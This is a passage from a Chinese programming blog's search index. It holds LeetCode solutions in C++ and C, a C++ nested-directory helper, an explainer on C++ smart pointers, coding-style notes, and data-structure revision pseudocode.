++i; while (i &lt; j &amp;&amp; nums[j] == nums[j - 1]) --j; ++i; --j; &#125; else if (nums[i] + nums[j] &lt; target) ++i; else --j; &#125; &#125; return res; &#125;&#125;; 感想果然还是不能被做过的题的思维所限制啊","categories":[{"name":"算法","slug":"算法","permalink":"https://liuyi12138.github.io/categories/算法/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://liuyi12138.github.io/tags/C/"},{"name":"Leetcode","slug":"Leetcode","permalink":"https://liuyi12138.github.io/tags/Leetcode/"}]},{"title":"C++刷Leetcode笔记之 8.String to Integer (atoi)","slug":"C++刷Leetcode笔记之 8.String to Integer (atoi)","date":"2018-08-21T03:37:04.000Z","updated":"2021-02-23T06:34:31.894Z","comments":true,"path":"2018/08/21/C++刷Leetcode笔记之 8.String to Integer (atoi)/","link":"","permalink":"https://liuyi12138.github.io/2018/08/21/C++刷Leetcode笔记之 8.String to Integer (atoi)/","excerpt":"在深信服组期间学习了C++的使用方法，就打算通过刷Leetcode来提高自己的算法能力以及对C++的掌握能力 Leetcode传送门","text":"在深信服组期间学习了C++的使用方法，就打算通过刷Leetcode来提高自己的算法能力以及对C++的掌握能力 Leetcode传送门 String to Integer (atoi) [Difficulty: Easy]题目 Implement atoi which converts a string to an integer. The function first discards as many whitespace characters as necessary until the first non-whitespace character is found. Then, starting from this character, takes an optional initial plus or minus sign followed by as many numerical digits as possible, and interprets them as a numerical value. The string can contain additional characters after those that form the integral number, which are ignored and have no effect on the behavior of this function. If the first sequence of non-whitespace characters in str is not a valid integral number, or if no such sequence exists because either str is empty or it contains only whitespace characters, no conversion is performed. If no valid conversion could be performed, a zero value is returned. Note:Only the space character ‘ ‘ is considered as whitespace character.Assume we are dealing with an environment which could only store integers within the 32-bit signed integer range: [−2^31, 2^31 − 1]. If the numerical value is out of the range of representable values, INT_MAX (2^31 − 1) or INT_MIN (−2^31) is returned. 123456class Solution &#123;public: int myAtoi(string str) &#123; &#125;&#125;; 我的思路思路也什么好说的，难点是判断该数是否越界123456789101112131415161718192021222324252627282930313233343536373839404142434445class Solution &#123;public: int myAtoi(string str) &#123; int result = 0; int max = str.size(); int flag = 0; //判断正负 int exit = 0; //判断'+''-'是否存在 int num = 0; //判断前面是否出现数字 for (int i = 0; i&lt;max; ++i) &#123; if (str[i] == '-' &amp;&amp; !num) &#123; if (exit) return 0; flag = 1; exit = 1; &#125; else if (str[i] == '+'&amp;&amp; !num) &#123; if (exit) return 0; exit = 1; &#125; else if (str[i] == ' '&amp;&amp; !num) &#123; if (exit) return 0; &#125; else if (str[i]&lt;'0' || str[i] &gt;'9') &#123; break; &#125; else &#123; num = 1; if (result &gt; (INT_MAX-(int)(str[i] - '0'))/10) &#123; if (flag) return INT_MIN; else return INT_MAX; &#125; result = result*10 + (int)(str[i] - '0'); printf(\"%s\\n\",&amp;str[i]); printf(\"%d\\n\",result); &#125; &#125; if (flag) result = 0 - result; return result; &#125;&#125;; 参考思路 比起我的代码，别人的代码优点在于: 逻辑清晰，我的代码标志符过杂乱 使用了long long，不用处理溢出的问题123456789101112131415161718192021222324252627282930313233343536373839class Solution &#123;public: int myAtoi(string str) &#123; long long sum = 0; int base=10; int n = str.size(); bool flag = true; //判断是否出现有效字符 int sign = 1; //判断正负 for(int i = 0; i &lt; n; i++) &#123; if(isalpha(str[i])) &#123; return sum; &#125; else if(str[i]==' '&amp;&amp;flag) &#123; continue; &#125; else if(str[i]&gt;='0' &amp;&amp; str[i]&lt;='9') &#123; sum = 10*sum + sign*(str[i] - '0'); flag = false; &#125; else if(str[i] == '-' &amp;&amp;flag) &#123; sign = -1; flag = false; &#125; else if(str[i] == '+' &amp;&amp; flag) &#123; flag = false; &#125; else return sum; if(sum &gt; INT_MAX) return INT_MAX; else if(sum &lt; INT_MIN) return INT_MIN; &#125; return sum; &#125;&#125;; 感想感觉这种题还是在考验对异常情况的处理，由于一开始没有全面的思考，其实代码是在一点点修修补补拼凑起来的，很多东西都没有考虑到","categories":[{"name":"算法","slug":"算法","permalink":"https://liuyi12138.github.io/categories/算法/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://liuyi12138.github.io/tags/C/"},{"name":"Leetcode","slug":"Leetcode","permalink":"https://liuyi12138.github.io/tags/Leetcode/"}]},{"title":"C++刷Leetcode笔记之 1.Two Sum","slug":"C++刷Leetcode笔记之 1.Two Sum","date":"2018-08-20T07:46:04.000Z","updated":"2021-02-23T06:34:31.894Z","comments":true,"path":"2018/08/20/C++刷Leetcode笔记之 1.Two Sum/","link":"","permalink":"https://liuyi12138.github.io/2018/08/20/C++刷Leetcode笔记之 1.Two Sum/","excerpt":"在深信服组期间学习了C++的使用方法，就打算通过刷Leetcode来提高自己的算法能力以及对C++的掌握能力 而Two Sum 是Leetcode的第一题，大一的时候也刷过，就先拿它来练手吧 Leetcode传送门","text":"在深信服组期间学习了C++的使用方法，就打算通过刷Leetcode来提高自己的算法能力以及对C++的掌握能力 而Two Sum 是Leetcode的第一题，大一的时候也刷过，就先拿它来练手吧 Leetcode传送门 Two Sum [Difficulty: Easy]题目 Given an array of integers, return indices of the two numbers such that they add up to a specific target. You may assume that each input would have exactly one solution, and you may not use the same element twice. Example: Given nums = [2, 7, 11, 15], target = 9, Because nums[0] + nums[1] = 2 + 7 = 9, return [0, 1]. 123456class Solution &#123;public: vector&lt;int&gt; twoSum(vector&lt;int&gt;&amp; nums, int target) &#123; &#125;&#125;; 我的思路1.最简单的思路就是两个for循环，比较简单，时间复杂度高 ，代码略2.进一步的思想既是一个for循环然后想用二分法解决问题 1)排序问题，想使用二分法则必须先排序，在此使用c++中的sort函数对vector进行排序 2)下标还原问题，由于打乱了原vector的顺序，故需要先保存一份原顺序，然后使用find函数查找得到的value在原vector中的位置 3)元素重复问题，若有原vector中有两个相同的元素，则下标还原时会取到两个相同的下标，故需要在找到第一个元素的下标时修改该元素的值 由于代码过于复杂且写出的代码bug太多了，故代码略 3.采用分治法解决问题 此思路来自分治法解决最大子数组问题的解法 将原vector排序后(从小到大)分为两部分，则需要寻找的两个数字的分布有三种可能: 1.都在左侧(小) 2.都在右侧(大) 3.左右两边各一个 都在左侧或都在右侧则将一个大问题转换为一个更小规格的同类问题 则只需要通过循环在左右两边各找出一个数即可 时间复杂度最高为n^2/4,但代码过于复杂，暂未实现 2020/1/30 使用C实现了分治法，由于还是需要部分遍历，并不比直接遍历快多少。1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950/** * Note: The returned array must be malloced, assume caller calls free(). */int ergodic(int* nums, int l, int h, int target, int* result)&#123; int med = (l + h) / 2; for(int i = l; i &lt;= med; ++i)&#123; for(int j = med + 1; j &lt;= h; ++j)&#123; if(target == nums[i] + nums[j])&#123; result[0] = i; result[1] = j; return 1; &#125; &#125; &#125; return 0;&#125;int find2Sum(int* nums, int l, int h, int target, int* result)&#123; if(h &lt;= l) return 0; if(h == l + 1)&#123; if(target == nums[l] + nums[h])&#123; result[0] = l; result[1] = h; return 1; &#125; return 0; &#125; int med = (l + h) / 2; int leftRes = find2Sum(nums, l, med, target, result); int rightRes = find2Sum(nums, med, h, target, result); if(!leftRes &amp;&amp; !rightRes) return ergodic(nums, l, h, target, result); else return 1;&#125;int* twoSum(int* nums, int numsSize, int target, int* returnSize)&#123; *returnSize = 0; if(numsSize &lt;= 1) return NULL; int* result = (int*)malloc(2*sizeof(int)); if(find2Sum(nums, 0, numsSize-1, target, result))&#123; *returnSize = 2; &#125; else&#123; *returnSize = 0; &#125; return result;&#125; 参考思路利用find函数搜索，省去一次for循环 1)存储问题，由于不能通过value搜索key则应该以下标为value 2)重复问题，若有多个相同的元素则key会重复，此时考虑用multimap(可存储重复key的map)12345678910111213141516171819class Solution &#123;public: vector&lt;int&gt; twoSum(vector&lt;int&gt; &amp;numbers, int target) &#123; multimap &lt;int,int&gt; nums; vector&lt;int&gt; result; multimap&lt;int,int&gt;::iterator it; for(int i = 0; i &lt; numbers.size(); i++) nums.insert(pair&lt;int, int&gt;(numbers[i], i)); for (it=nums.begin(); it!=nums.end(); ++it) &#123; if (nums.find(target - it-&gt;first) != nums.end() &amp;&amp; nums.find(target - it-&gt;first)-&gt;second != it-&gt;second) &#123; result.push_back(it-&gt;second); result.push_back(nums.find(target - it-&gt;first)-&gt;second); sort(result.begin(),result.end()); return result; &#125; &#125; return result; &#125;&#125;; 感想果然轮子才是第一生产力，一个multimap解决了n多问题。。。不过我对容器的把我能力确实还不够","categories":[{"name":"算法","slug":"算法","permalink":"https://liuyi12138.github.io/categories/算法/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://liuyi12138.github.io/tags/C/"},{"name":"Leetcode","slug":"Leetcode","permalink":"https://liuyi12138.github.io/tags/Leetcode/"}]},{"title":"C++创建多层目录","slug":"C++创建多层目录","date":"2018-07-26T10:54:16.000Z","updated":"2021-02-23T06:34:31.894Z","comments":true,"path":"2018/07/26/C++创建多层目录/","link":"","permalink":"https://liuyi12138.github.io/2018/07/26/C++创建多层目录/","excerpt":"在网上找了好久都没找到能不引用一些乱七八糟的库而创建多层目录的C++代码，于是走上了自己造轮子的不归路","text":"在网上找了好久都没找到能不引用一些乱七八糟的库而创建多层目录的C++代码，于是走上了自己造轮子的不归路 123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;#include &lt;sys/stat.h&gt;std::string filepath = \"/sdcard/xxx/xxx/xxx/xxx.json\";std::fstream file;std::string tempFilename = \"/\";char filenames[100];std::strcpy(filenames,filepath.c_str());char *token = std::strtok(filenames, \"/\");while (token != NULL) &#123; tempFilename += token; token = std::strtok(NULL, \"/\"); file.open(tempFilename, std::ios::in); if (!file.is_open())&#123; if (tempFilename == filepath)&#123; std::ofstream outfile; SE_LOG_INFO(kSettingModule,\"Write File\"); outfile.open(filepath.c_str()); if (outfile.fail()) &#123; outfile.close(); SE_LOG_ERROR(kSettingModule, \"Mkdir ERROR\"); return (-1); &#125; outfile.close(); &#125; else&#123; int flag = mkdir(tempFilename.c_str(), 0777); if (flag != 0)&#123; SE_LOG_ERROR(kSettingModule, \"Mkdir ERROR\"); return (-1); &#125; &#125; &#125; file.close(); tempFilename += \"/\";&#125;","categories":[{"name":"编程语言","slug":"编程语言","permalink":"https://liuyi12138.github.io/categories/编程语言/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://liuyi12138.github.io/tags/C/"},{"name":"轮子","slug":"轮子","permalink":"https://liuyi12138.github.io/tags/轮子/"}]},{"title":"C++智能指针简介","slug":"C++智能指针简介","date":"2018-07-23T15:09:26.000Z","updated":"2021-02-23T06:34:31.910Z","comments":true,"path":"2018/07/23/C++智能指针简介/","link":"","permalink":"https://liuyi12138.github.io/2018/07/23/C++智能指针简介/","excerpt":"一.使用背景由于 C++ 语言没有自动内存回收机制，程序员每次 new 出来的内存都要手动 delete，比如流程太复杂，最终导致没有 delete，异常导致程序过早退出，没有执行 delete 的情况并不罕见，并造成内存泄露。因此C++ 引用了智能指针，智能指针即是C++RAII的一种应用，可用于动态资源管理，资源即对象的管理策略。 智能指针在&lt;memory&gt;标头文件的 std 命名空间中定义。","text":"一.使用背景由于 C++ 语言没有自动内存回收机制，程序员每次 new 出来的内存都要手动 delete，比如流程太复杂，最终导致没有 delete，异常导致程序过早退出，没有执行 delete 的情况并不罕见，并造成内存泄露。因此C++ 引用了智能指针，智能指针即是C++RAII的一种应用，可用于动态资源管理，资源即对象的管理策略。 智能指针在&lt;memory&gt;标头文件的 std 命名空间中定义。 智能指针的优点 1）智能指针能够帮助我们处理资源泄露问题； 2）它也能够帮我们处理空悬指针的问题； 3）它还能够帮我们处理比较隐晦的由异常造成的资源泄露。 二.各类智能指针用法简介C++ 智能指针主要包括：unique_ptr,shared_ptr, weak_ptr, 这三种(auto_ptr 已被遗弃) 1.shared_ptr的使用1)shared_ptr多个指针指向相同的对象shared_ptr使用引用计数，每一个shared_ptr的拷贝都指向相同的内存，每使用他一次，内部的引用计数加1，每析构一次，内部的引用计数减1，减为0时，自动删除所指向的堆内存。 2)创建方式shared_ptr的创建,有两种方式12shared_ptr&lt;int&gt; p1 = make_shared&lt;int&gt;(1);// 通过make_shared函数shared_ptr&lt;int&gt; p2(new int(2));// 通过原生指针构造 3)注意事项 智能指针是一个类不是指针，不能将指针直接赋值给一个智能指针 例如std::shared_ptr p4 = new int(1);的写法是错误的 拷贝使得对象的引用计数增加1，赋值使得原对象引用计数减1,后来指向的对象引用计数加1 不要用一个原始指针初始化多个shared_ptr，否则会造成二次释放同一内存 循环引用问题 4)代码示例12345678910111213141516171819202122#include &lt;iostream&gt;#include &lt;memory&gt;int main() &#123; &#123; int a = 1; std::shared_ptr&lt;int&gt; ptra = std::make_shared&lt;int&gt;(a); std::shared_ptr&lt;int&gt; ptra2(ptra); //拷贝，引用计数+1 std::cout &lt;&lt; ptra.use_count() &lt;&lt; std::endl; //2 int b = 2; int *pb = &amp;a; //std::shared_ptr&lt;int&gt; ptrb = pb; //将指针赋值给一个智能指针 error std::shared_ptr&lt;int&gt; ptrb = std::make_shared&lt;int&gt;(b); ptra2 = ptrb; //赋值，引用计数-1 pb = ptrb.get(); //获取原始指针 std::cout &lt;&lt; ptra.use_count() &lt;&lt; std::endl; //2 std::cout &lt;&lt; ptrb.use_count() &lt;&lt; std::endl; //1 &#125; //超出作用域，内存释放&#125; 2.unique_ptr的使用1）unique_ptr同一时刻只能有一个unique_ptr指向给定对象unique_ptr禁止拷贝语义、只能通过移动语义转移所有权 2)创建方式unique_ptr的创建,与shared_ptr相似，也是两种方式12shared_ptr&lt;int&gt; p1 = make_unique&lt;int&gt;(1);std::unique_ptr&lt;int&gt; uptr(new int(2)); 3)注意事项 通过reset方法重新指定 通过移动语义转移所有权 通过release方法释放所有权 4)代码示例1234567891011121314#include &lt;iostream&gt;#include &lt;memory&gt;int main() &#123; &#123; std::unique_ptr&lt;int&gt; uptr(new int(10)); //绑定动态对象 //std::unique_ptr&lt;int&gt; uptr2 = uptr; //不能赋值 error //std::unique_ptr&lt;int&gt; uptr2(uptr); //不能拷贝 error std::unique_ptr&lt;int&gt; uptr2 = std::move(uptr); //转移所有权 uptr2.reset(new int(20)); //重新指定对象 uptr2.release(); //释放所有权 &#125; //超出uptr的作用域，内存释放&#125; 2.weak_ptr的使用1）weak_ptr是为了配合shared_ptr而引入的一种智能指针weak_ptr的最大作用在于协助shared_ptr工作，像旁观者那样观测资源的使用情况 2)创建方式weak_ptr可以从一个shared_ptr或者另一个weak_ptr对象构造，获得资源的观测权12std::weak_ptr&lt;int&gt; wp1(sh_ptr); //通过shared_ptr构造std::weak_ptr&lt;int&gt; wp2(wp1);/ //通过另一个weak_ptr构造 3)注意事项 weak_ptr可以使用成员函数lock()从被观测的shared_ptr获得一个可用的shared_ptr对象 weak_ptr的成员函数expired()用来观测资源的引用计数是否为0,若use_count()==0,则expired()==true 4)代码示例12345678910111213141516171819#include &lt;iostream&gt;#include &lt;memory&gt;int main() &#123; &#123; std::shared_ptr&lt;int&gt; sh_ptr = std::make_shared&lt;int&gt;(1); std::cout &lt;&lt; sh_ptr.use_count() &lt;&lt; std::endl;//1 std::weak_ptr&lt;int&gt; wp(sh_ptr); std::cout &lt;&lt; wp.use_count() &lt;&lt; std::endl; //1,构造weak_ptr不增加引用计数 if(!wp.expired())&#123; std::shared_ptr&lt;int&gt; sh_ptr2 = wp.lock(); //使用成员函数lock() *sh_ptr2 = 100; std::cout &lt;&lt; wp.use_count() &lt;&lt; std::endl; //2 &#125; &#125; //超出作用域，内存释放&#125; 三.循环引用问题1.循环引用代码示例12345678910111213141516171819202122232425262728class B;class A&#123;public: shared_ptr&lt;B&gt; m_b;&#125;; class B&#123;public: shared_ptr&lt;A&gt; m_a;&#125;; int main()&#123; &#123; shared_ptr&lt;A&gt; a(new A); //new出来的A的引用计数此时为1 shared_ptr&lt;B&gt; b(new B); //new出来的B的引用计数此时为1 a-&gt;m_b = b; //B的引用计数增加为2 b-&gt;m_a = a; //A的引用计数增加为2 &#125; //b先出作用域，B的引用计数减少为1，不为0，所以堆上的B空间没有被释放，且B持有的A也没有机会被析构，A的引用计数也完全没减少 //a后出作用域，同理A的引用计数减少为1，不为0，所以堆上A的空间也没有被释放 //a和b互相抓住对方的引用不放，导致内存泄漏&#125; 2.解除循环引用的方法一般来讲，解除这种循环引用有下面有三种可行的方法(参考)： 1)当只剩下最后一个引用的时候需要手动打破循环引用释放对象 2)当A的生存期超过B的生存期的时候，B改为使用一个普通指针指向A 3)使用弱引用的智能指针打破这种循环引用 但方法1和方法2都需要程序员手动控制，麻烦且容易出错,所以我们一般使用第三种方法：弱引用的智能指针weak_ptr 对于示例中的代码，只需要将shared_ptr&lt;B&gt; m_b改为weak_ptr&lt;B&gt; m_b,则B的引用计数不会增加为2,B出作用域后可以正常释放,A也就能正常释放了 三.shared_ptr智能指针类的简单实现1.智能指针的原理 1)创建新对象时，初始化指针，并设置引用计数为1 2)当对象作为另外一个对象的副本创建，也就是调用拷贝构造函数时，拷贝指针，并且，增加引用计数 3)当对一个对象进行赋值时，左操作数所指对象的引用计数减少，如果减少为0，则删除对象，右操作数所指对象的引用计数增加 4)调用析构函数，减少引用计数，如果减至0，则删除指针 2.智能指针的实现引用计数的实现由两种经典策略：引入辅助类和使用句柄。 1)辅助类实现引用计数 U_Ptr作为辅助类,封装实际的指针对象和引用计数值 HasPtr作为对外使用的类，构造时传入实际的指针对象 HasPtr内部包含了一个辅助类U_Ptr的指针对象，多个HasPtr类对象指向同一个U_Ptr对象 U_Ptr依靠引用计数来实现实际指针对象的释放 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586//模板类作为友元类，要事先声明template &lt;class T&gt; class HasPtr; //辅助类template&lt;typename T&gt;class U_Ptr &#123; friend class HasPtr&lt;T&gt;; //友元类 T *ip; //实际指针对象 size_t use; //引用计数 U_Ptr(T *p) :ip(p), use(1) &#123; &#125;//构造函数 ~U_Ptr() //析构函数 &#123; delete ip; &#125;&#125;; template&lt;typename T&gt;class HasPtr &#123;public: // 构造函数，引用计数初始化为1 explicit HasPtr(T *p) :ptr(new U_Ptr&lt;T&gt;(p)) &#123; &#125; // 拷贝构造函数，引用计数加1 HasPtr(const HasPtr&lt;T&gt; &amp;orig) :ptr(orig.ptr) &#123; ++ptr-&gt;use; &#125; //赋值 HasPtr&lt;T&gt;&amp; operator=(const HasPtr&lt;T&gt;&amp; rhs) &#123; ++rhs.ptr-&gt;use; // 操作符右值自加 if (--ptr-&gt;use == 0) //左值自减，并判断是否减至0 delete ptr; // 减至0则删除 ptr = rhs.ptr; // 拷贝指针 return *this; &#125; // 析构，自减 ~HasPtr() &#123; if (--ptr-&gt;use == 0) delete ptr; &#125; //重载箭头运算符 T* operator-&gt;() &#123; if(ptr) return ptr; throw std::runtime_error(\"access through NULL pointer\"); &#125; const T* operator-&gt;() const &#123; if(ptr) return ptr; throw std::runtime_error(\"access through NULL pointer\"); &#125; //重载解引用运算符 T&amp; operator*() &#123; if(ptr) return *ptr; throw std::runtime_error(\"dereference of NULL pointer\"); &#125; const T&amp; operator*() const &#123; if(ptr) return *ptr; throw std::runtime_error(\"dereference of NULL pointer\"); &#125; private: U_Ptr&lt;T&gt; *ptr; // 辅助类对象&#125;; 2)句柄类实现引用计数不用引入辅助类，可以直接把指针封装起来。然后，重载操作符，定义为一个指针的行为 1)定义一个SmartPtr对象P1，传入实际指针对象，调用构造函数，初始化计数为1 2)定义一个SmartPtr对象P2，调用拷贝构造函数，此时，P1和P2的ptr指向相同的地址，pUse指向相同的地址，引用计数自加 3)定义一个SmartPtr对象P3，调用赋值，操作符右操作数引用计数自加，左操作数自减，并判断原引用计数是否为0，如果是0，则删除原ptr指针指向的地址内容，赋值ptr和pUse，指向相同的ptr和pUse 4)析构时，引用计数自减，并判断计数值是否为0，如果是0，则自动删除指针对象 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778template&lt;typename T&gt;class SmartPtr&#123;public: SmartPtr(T* p= 0) //构造函数 :ptr(p),pUse(new size_t(1)) &#123;&#125; ~SmartPtr() //析构函数 &#123; decrUse(); &#125; //拷贝构造函数，引用计数加1 SmartPtr(const SmartPtr&lt;T&gt;&amp; src) :ptr(src.ptr),pUse(src.pUse) &#123; ++*pUse; &#125; //赋值 SmartPtr&lt;T&gt;&amp; operator=(const SmartPtr&lt;T&gt;&amp; rhs) &#123; if (rhs.ptr != ptr) &#123; ++*rhs.pUse; decrUse(); ptr = rhs.ptr; pUse = rhs.pUse; &#125; return *this; &#125; //重载箭头运算符 T* operator-&gt;() &#123; if(ptr) return ptr; throw std::runtime_error(\"access through NULL pointer\"); &#125; const T* operator-&gt;() const &#123; if(ptr) return ptr; throw std::runtime_error(\"access through NULL pointer\"); &#125; //重载解引用运算符 T&amp; operator*() &#123; if(ptr) return *ptr; throw std::runtime_error(\"dereference of NULL pointer\"); &#125; const T&amp; operator*() const &#123; if(ptr) return *ptr; throw std::runtime_error(\"dereference of NULL pointer\"); &#125; private: void decrUse() &#123; if(--*pUse == 0) &#123; delete ptr; delete pUse; &#125; &#125; private: T* ptr; size_t* pUse;&#125;;","categories":[{"name":"编程语言","slug":"编程语言","permalink":"https://liuyi12138.github.io/categories/编程语言/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://liuyi12138.github.io/tags/C/"}]},{"title":"C++代码规范&重难点","slug":"C++代码规范&重难点","date":"2018-07-19T02:04:04.000Z","updated":"2021-02-23T06:34:31.894Z","comments":true,"path":"2018/07/19/C++代码规范&重难点/","link":"","permalink":"https://liuyi12138.github.io/2018/07/19/C++代码规范&重难点/","excerpt":"本文为我在深信服组写C++期间总结的部分问题","text":"本文为我在深信服组写C++期间总结的部分问题 重难点1.static 类的静态成员函数是属于整个类而非类的对象，所以它没有this指针，这就导致了它仅能访问类的静态数据和静态成员函数 静态数据成员是静态存储的，所以必须对它进行初始化,初始化在类体外进行，而前面不加static，以免与一般静态变量或对象相混淆2.const const 是constant的缩写，本意是不变的，不易改变的意思 const修饰普通类型的变量时，变量不能被再次赋值 const修饰类成员函数可防止成员函数改变类的静态数据 函数前加const是指该函数的返回值是“常量”，不可修改，通常这样的函数返回一个引用(&amp;)或指针。 函数后加const是指该函数不会改变成员变量 const和static不能同时使用，static关键字修饰静态成员函数，不可实例化，而const成员函数不许操作某一实例，与实例相关 3.c++引用传递传值的本质是：形参是实参的一份复制，传引用的本质是：形参和实参是同一个东西 传值的弊端：如果传入的是一个类或较大的数据类型的话，copy一份值会浪费大量的空间，尤其是传类时，若有复杂的继承关系，对参数进行复制是非常不明智的选择 4.关于指针的值传递和引用传递12void func_1(int* arr); //指针类型，传值（复制产生新变量）void func_2(int*&amp; arr); //指针类型，传引用（形参和实参是同一个东西） 如果把指针也当做一种普通数据类型来看可能更好理解，对指针进行值传递时，会复制一个新的指针指向原指针指向的值，依旧可以操作该值，但改变这个指针的指向时，原指针的指向不变;对指针进行引用传递时，改变指针的指向原指针指向也改变。 代码规范命名规范 静态数据成员的命名应该以s_为前缀 成员变量的命名应该以m_为前缀 全局变量使用g_为前缀 常量使用c_为前缀 指针使用p开头 一般变量命名不使用下划线，采用setGlobalConfig这种命名方式(首字母小写，驼峰命名) 函数动作名称开头，首字母小写，驼峰命名 string 统一添加std::命名空间 声明规范 头文件包含顺序：本工程内文件，第三方库头文件，系统头文件，标准库头文件 只在模块内的全局变量应添加static 多次使用的字符串定义为字符串常量(也可使用宏) 头文件中不允许使用 using namespace，避免污染包含者的命名空间 函数注释写在头文件中应说明 12345/*function： 函数功能@param 参数名 参数说明@return 返回值 返回值说明*/ 逻辑规范 对外函数，先判断参数合法性，如不合法添加日志记录 类参数使用const引用传递","categories":[{"name":"编程语言","slug":"编程语言","permalink":"https://liuyi12138.github.io/categories/编程语言/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://liuyi12138.github.io/tags/C/"}]},{"title":"华中科技大学数据结构复习资料","slug":"华中科技大学数据结构复习资料","date":"2018-05-29T13:24:12.000Z","updated":"2021-02-23T06:34:31.925Z","comments":true,"path":"2018/05/29/华中科技大学数据结构复习资料/","link":"","permalink":"https://liuyi12138.github.io/2018/05/29/华中科技大学数据结构复习资料/","excerpt":"众所周知，数据结构是一门写伪代码的学科，特在此总结各路伪码给大家参考","text":"众所周知，数据结构是一门写伪代码的学科，特在此总结各路伪码给大家参考 伪码基本操作比较 EQ // EQUAL等于 NE // NOT EQUAL不等于 GT // GREATER THAN大于 LT // LESS THAN小于 GE // GREATER THAN OR EQUAL 大于等于 LE // LESS THAN OR EQUAL 小于等于 线性表 InitList( &amp;L ); //建空表，初始化 DestoryList( &amp;L ); //撤销表，释放内存 int LengthList( L ); //求表中元素个数，即表长 POSITION LocateElem (L,ElemType e，compare() ) //查找e PriorElem( L, cur_e, &amp;pre_e ); //求当前元素e的前驱 NextElem( L, cur_e, &amp;next_e ); //求当前元素e的后继 ListInsertBefore(&amp;L, i, e ); //把e插入到第i个元素之前 ListDelete( &amp;L, i,&amp;e ); //删除第i个元素并“看”此元素 ListTraverse( L, Visit() ); // “看”表中全部元素（遍历） 栈 InitStack(&amp;S); //构造一个空栈 DestroyStack(&amp;S); //销毁栈s ClearStack(&amp;S); //将S清为空栈 StackEmpty(S); //若栈S为空栈，返回True; 否则返回 False StackLength(S); //返回栈S的元素个数，即栈的长度 GetTop(S, &amp;e); //用e返回栈S的栈顶元素 Push(&amp;S, e); //插入元素e为新的栈顶元素 Pop(&amp;S, &amp;e); //删除S的栈顶元素，并用e返回其值 队列 InitQueue(&amp;Q); //构造一个空队列Q DestroyQueue(&amp;Q); //销毁队列Q QueueLength(Q); //返回队列Q的长度 ClearQueue(&amp;Q); //将队列清为空队列 GetHead(Q, &amp;e); //用e返回Q的队头元素 EnQueue(&amp;Q, e); //插入元素e为Q的新的队尾元素 DeQueue(&amp;Q, &amp;e); //删除Q的队头元素，并用e返回其值 串 StrAssign(&amp;T, chars); // 串赋值，生成值为chars的串T StrCompare(S,T); // 串比较，若S&gt;T，返回值大于0… StrLength(S); // 求串长，即返回串S中的元素个数 Concat(&amp;T, S1, S2); // 串连接，用T返回S1＋S2的新串 SubString(&amp;Sub, S, pos, len); //求S中pos起长度为len的子串 广义表 GetHead(L); //取广义表L的头 GetTail(L); //取广义表L的尾 图 CreateGraph(&amp;G, num); //构造一个顶点数为num，边数为0的图 DestroyGraph(&amp;G); //销毁图 G FirstAdjVex(G, v); //返回 v 的第一个邻接点 NextAdjVex(G, v, w); //返回 v 的（相对于 w 的）下一个邻接点 InsertEdge(&amp;G, v, w); //在 G 中增添以v, w为顶点的边 DeleteEdge(&amp;G, v, w); //在 G 中删除以v, w为顶点的边 基础知识点线性表 顺序表的插入与删除(时间复杂度O(n)) 链表节点的插入，删除，查找 插入方法有头插法和尾插法，删除类比插入 单链表查找的时间复杂度为O(n) 插入与删除时间复杂度为O(1) 双向链表，循环链表,双向循环链表,静态链表的基本操作 栈与队列栈与队列是特殊的链表 栈的应用——表达式求值 分别运用运算符栈和操作数栈分解表达式 逆波兰表达式 循环队列 在循环队列中，空队和队满时都有front=rear；判决条件将出现二义性 解决方法： 使用一个计数单元记录队列中的元素个数 加设标志位，删除时置1,插入时置0(分离插入后和删除后出现判决条件) 空一个单元，队满特征改为front=(rear+1)%N 二叉树 二叉树的遍历： 先序遍历 中序遍历 后序遍历 层次遍历 遍历算法的应用： 输出二叉树的节点 输出二叉树的叶子节点 统计叶子节点数目 求二叉树的高度 遍历主要分为整体遍历和分别遍历左右子树两种 线索二叉树：空指针指向父节点 树和二叉树之间的转换 树转二叉树(兄弟相连 长兄为父 头树为根 孩子靠左) 二叉树转树(右孩子变为兄弟) Huffman树(最优二叉树) 代码实现 1234567for(i=n+1;i&lt;=m;++i)&#123; //建哈夫曼树,并保存树的父子关系Select(Ht,i-1,s1,s2); Ht[s1].parent=i;Ht[s2].parent=i;Ht[i].lchild=s1;Ht[i].rchild=s2;Ht[i].weight=Ht[s1].weight+Ht[s2].weight;&#125; 12345678910111213// 从叶子到根逆向求每个字符的哈夫曼编码 cd[n-1]=&apos;\\0&apos;; //编码结束符 int start;for(i=1;i&lt;=n;++i)&#123; //逐个字符求哈夫曼编码start=n-1;for(c=i,f=Ht[i].parent;f!=0;c=f,f=Ht[f].parent)&#123;if(Ht[f].lchild==c)cd[--start]=&apos;0&apos;;else cd[--start]=&apos;1&apos;;&#125;//cd[n-1]=&apos;\\0&apos;;Hc[i]=(char *)malloc((n-start)*sizeof(char));strcpy(Hc[i],&amp;cd[start]);&#125; 图 图的遍历 深度优先搜索(DFS) 1234567891011121314151617void DFSTraverse(Graph G,int v)&#123; /* 对图 G 作深度优先遍历 */for (v=0; v&lt;G.vexnum; ++v) visited[v] = FALSE; // 访问标志数组初始化for (v=0; v&lt;G.vexnum; ++v) if (!visited[v]) // 对尚未访问的顶点调用DFS DFS(G, v); &#125;void DFS(Graph G, int v) &#123; /* 从顶点v出发，深度优先搜索遍历连通图 G */ visited[v] = TRUE; //访问第v个顶点 VisitFunc(v); for( w=FirstAdjVex(G,v) ; w!=0 ; w=NextAdjVex(G,v,w ) ) if (!visited[w]) DFS(G, w); &#125; // DFS 广度优先搜索(BFS) 123456789101112131415161718void BFSTraverse(Graph G,int v) &#123; for (v=0; v&lt;G.vexnum; ++v) visited[v] = FALSE; //初始化 InitQueue(Q); //置空的辅助队列Q for (v=0; v&lt;G.vexnum; ++v) //最外层大循环，每个顶点都要搜索 if (!visited[v]) &#123; //v尚未访问 visited[v]=TRUE; visit(v); EnQueue(Q, v); //v入队列 while (!QueueEmpty(Q)) &#123; DeQueue(Q, u); //对头元素出队，记为u for (w=FirstAdjVex(G,u); w; 